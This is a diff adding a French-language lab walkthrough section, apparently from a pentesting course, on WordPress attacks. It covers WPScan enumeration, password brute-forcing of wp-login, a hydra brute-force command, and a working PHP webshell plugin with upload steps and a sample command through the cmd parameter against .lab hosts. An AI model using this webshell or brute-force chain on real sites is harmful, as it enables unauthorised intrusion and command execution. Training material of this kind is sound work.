@@ -733,7 +733,126 @@ nmap 192.168.6.128/26 -p 6379</code></pre>
 <pre><code>hydra -t 64 -L /tmp/usernames -P /tmp/passwords angelsscooters.lab -u -V https-post-form '/index.php?page=login:username=^USER^&password=^PASS^:unable to log in with that info' -f</code></pre>
 
   </div>
-  <div id="s8" class="content"><div class="section-title">VIII. WPScan – Advanced</div></div>
+  <div id="s8" class="content"><div class="section-title">VIII. WPScan – Advanced</div>
+    <h3>🔍 Basic Scanning</h3>
+
+<p>Lancez un scan simple :</p>
+<pre><code>wpscan --url https://portal.avrp.lab</code></pre>
+
+<hr>
+
+<h3>🔑 API Tokens</h3>
+
+<p>Pour utiliser l’API WPScan :</p>
+<pre><code>wpscan --url WEBSITE_URL_HERE --api-token API_TOKEN_HERE</code></pre>
+
+<hr>
+
+<h3>⚡ Scan agressif</h3>
+
+<p>Utilisez l’option <code>--plugins-detection aggressive</code> pour un scan poussé :</p>
+<pre><code>wpscan --url URL_HERE --api-token API_TOKEN_HERE --plugins-detection aggressive</code></pre>
+
+<h4>💡 Astuce</h4>
+<p>Lire la section <code>--plugins-detection</code> dans la documentation :</p>
+
+<pre><code>
+--plugins-detection MODE  
+Utilise le mode spécifié pour l’énumération des plugins, au lieu du mode global (--detection-mode).
+
+Valeur par défaut : passive
+
+Modes disponibles : mixed, passive, aggressive
+</code></pre>
+
+<hr>
+
+<h3>👤 User Enumeration</h3>
+
+<p>Pour énumérer les utilisateurs :</p>
+<pre><code>wpscan --url https://portal.avrp.lab --enumerate u</code></pre>
+
+<p>Pour tester les mots de passe avec attaque sur wp-login :</p>
+<pre><code>wpscan --url https://portal.avrp.lab --usernames admin --passwords /root/Desktop/passwords.txt --password-attack wp-login</code></pre>
+
+<hr>
+
+<h3>💥 Exploiter le plugin vulnérable (Optionnel)</h3>
+
+<p>
+  Cette étape permet d’obtenir une <b>exécution de code à distance</b> en important un plugin webshell.
+</p>
+
+<p>Voici un plugin malveillant minimal :</p>
+
+<pre><code>&lt;?php
+/**
+* Plugin Name: MaliciousWebshell
+* Plugin URI: https://maliciouswebshell.lab
+* Description: Wordpress malicious webshell
+* Version: 1.0
+* Author: mal
+* Author URI: https://mal.lab
+* License: https://thereisnolicense
+*/
+if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?&gt;
+</code></pre>
+
+<p>
+📝 <b>Important :</b>  
+Les commentaires PHP sont obligatoires, sinon WordPress refusera d’installer le plugin.
+</p>
+
+<h4>🛠️ Création du plugin</h4>
+<p>
+  1️⃣ Copiez le code ci-dessus dans un fichier :
+</p>
+<pre><code>shell.php</code></pre>
+
+<p>2️⃣ Zippez le plugin :</p>
+<pre><code>zip shell.zip shell.php</code></pre>
+
+<p>
+  3️⃣ Connectez-vous à WordPress → <b>Plugins → Add new</b>  
+  4️⃣ Importez <code>shell.zip</code>  
+  5️⃣ Activez le plugin
+</p>
+
+<hr>
+
+<h3>🚀 Exécution de commandes via le webshell</h3>
+
+<p>
+  Une fois activé, ce plugin permet d’exécuter n’importe quelle commande via le paramètre GET <code>cmd</code>.
+</p>
+
+<p>Exemple pour lire un fichier sur la cible :</p>
+<pre><code>https://portal.avrp.lab/?cmd=cat%20%2Fvar%2Fwww%2Fwordpress%2Fproof-of-exploit.php</code></pre>
+
+<p>
+  Le résultat se trouve dans les commentaires PHP.  
+  Pour l’afficher : clic droit → <b>View Page Source</b>.
+</p>
+
+<p>Exemple d’affichage :</p>
+
+<pre><code>&lt;?php
+/*
+Answer:
+ieteiSohthaifae2ooja
+*/
+?&gt;
+</code></pre>
+
+<p>
+  ⚠️ Le mot de passe (Answer) est généré dynamiquement — le tien sera différent.
+</p>
+
+  </div>
   <div id="s9" class="content"><div class="section-title">IX. Macro Malware – Advanced</div></div>
   <div id="s10" class="content"><div class="section-title">X. Tomcat & LSASS Dump – Advanced</div></div>
   <div id="s11" class="content"><div class="section-title">XI. NodeJS Upload – Advanced</div></div>
